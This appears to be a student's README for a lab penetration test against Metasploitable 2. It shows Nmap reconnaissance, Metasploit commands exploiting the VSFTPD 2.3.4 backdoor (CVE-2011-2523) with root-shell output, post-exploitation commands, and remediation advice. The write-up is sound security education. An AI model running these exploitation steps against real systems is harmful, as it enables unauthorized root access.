# 🔐 Metasploitable 2 – Penetration Test Lab Report

> **⚠️ DISCLAIMER:** This project was conducted in a completely isolated virtual lab environment for **educational purposes only**. All activities were performed on intentionally vulnerable machines with explicit authorization. Unauthorized penetration testing is **illegal** and unethical. Do not attempt to replicate this on any system you do not own or have written permission to test.

---

## 📋 Overview

This repository documents a full penetration test performed against **Metasploitable 2**, a deliberately vulnerable Linux virtual machine designed for security training. The exercise demonstrates a real-world attack chain from initial reconnaissance to full root access.

| Field | Details |
|---|---|
| **Attacker Machine** | Kali Linux – `192.168.56.101` |
| **Target Machine** | Metasploitable 2 – `192.168.56.102` |
| **Network** | VirtualBox Host-Only (Isolated) |
| **Tools Used** | Nmap, Metasploit Framework v6.4.99-dev |
| **Exploit** | CVE-2011-2523 (VSFTPD 2.3.4 Backdoor) |
| **Result** | ✅ Full Root Access (`uid=0`) |

---

## 🗂️ Repository Contents

```
├── README.md                              ← You are here
└── Pentest_Report_Metasploitable2_v2.pdf  ← Full report with screenshots
```

---

## 🧪 Lab Setup

### Requirements
- [VirtualBox](https://www.virtualbox.org/) (or VMware)
- [Kali Linux](https://www.kali.org/get-kali/) (Attacker)
- [Metasploitable 2](https://sourceforge.net/projects/metasploitable/) (Target)

### Network Configuration
Both VMs were placed on a **Host-Only Network** (`192.168.56.0/24`) with no internet access, ensuring a fully isolated and safe environment.

---

## 🔍 Attack Methodology

### Phase 1 – Reconnaissance
Used **Nmap** to discover live hosts and enumerate open ports/services on the target subnet.

```bash
nmap -sV -O 192.168.56.0/24
```

**Key findings:**
- Port `21` running **VSFTPD 2.3.4** → *Critical backdoor vulnerability*
- OS: Linux kernel `2.6.24-16-server` (end-of-life since 2015)
- 7+ exposed services with known CVEs

---

### Phase 2 – Exploitation (CVE-2011-2523)

**Vulnerability:** VSFTPD 2.3.4 contains a backdoor. Sending a username containing `:)` causes the daemon to open a root shell on port `6200`.

```bash
msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.56.102
run
```

**Result:**
```
[+] 192.168.56.102:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.56.101:35961 → 192.168.56.102:6200)
```

---

### Phase 3 – Post-Exploitation

After gaining root shell access, the following was confirmed:

```bash
whoami       # root
pwd          # /
uname -a     # Linux metasploitable 2.6.24-16-server
ls /         # Full filesystem visible
```

**Proof of Access:**
```bash
echo "IM DEEP INSIDE YOU" >> /usr/games/banner
```
Successfully wrote to the target filesystem as root — confirming full, unrestricted access.

---

## 📸 Screenshots

All screenshots are embedded in the full PDF report:

| Figure | Description |
|---|---|
| Figure 1 | Nmap scan output — live host & port discovery |
| Figure 2 | Metasploit — searching & loading VSFTPD exploit module |
| Figure 3 | Metasploit — setting RHOST & running the exploit |
| Figure 4 | Root shell — `whoami`, `ls /`, `uname -a` |
| Figure 5 | Banner file modification — proof of filesystem access |

---

## 🛡️ Findings & Recommendations

| Severity | Finding | Fix |
|---|---|---|
| 🔴 Critical | VSFTPD 2.3.4 backdoor (CVE-2011-2523) | Upgrade to 2.3.5+ or disable FTP |
| 🟠 High | Linux kernel 2.6.24 (EOL, 2008) | Update OS and kernel |
| 🟠 High | No firewall / IDS deployed | Enable iptables/ufw + Snort/Suricata |
| 🟡 Medium | Default credentials in use | Enforce strong password policy |
| 🟡 Medium | Unused services exposed | Disable Telnet, VNC, IRC, R-services |

---

## 📚 What I Learned

- How to perform network reconnaissance with **Nmap**
- How to use **Metasploit Framework** to search, configure, and execute exploits
- Understanding of the **VSFTPD 2.3.4 backdoor** (CVE-2011-2523) and how it works
- Post-exploitation techniques: privilege verification, filesystem navigation
- How to document penetration test findings professionally

---

## 🧰 Tools Used

| Tool | Purpose |
|---|---|
| [Nmap](https://nmap.org/) | Network scanning & service enumeration |
| [Metasploit Framework](https://www.metasploit.com/) | Exploitation framework |
| [Kali Linux](https://www.kali.org/) | Attacker OS |
| [Metasploitable 2](https://sourceforge.net/projects/metasploitable/) | Intentionally vulnerable target |

---

## 📄 Full Report

The complete penetration test report (with all screenshots embedded as evidence) is available as a PDF in this repository:

📥 **[Pentest_Report_Metasploitable2_v2.pdf](./Pentest_Report_Metasploitable2_v2.pdf)**

---

## ⚖️ Legal & Ethical Notice

This project was conducted **solely within an isolated lab environment** using machines designed for this purpose. No real systems, networks, or individuals were targeted. This repository is intended to demonstrate security research skills and document learning progress in ethical hacking.

**Do not use these techniques on any system without explicit written authorization.**

---

*Made with 🖥️ on Kali Linux | Ethical Hacking Lab Exercise*
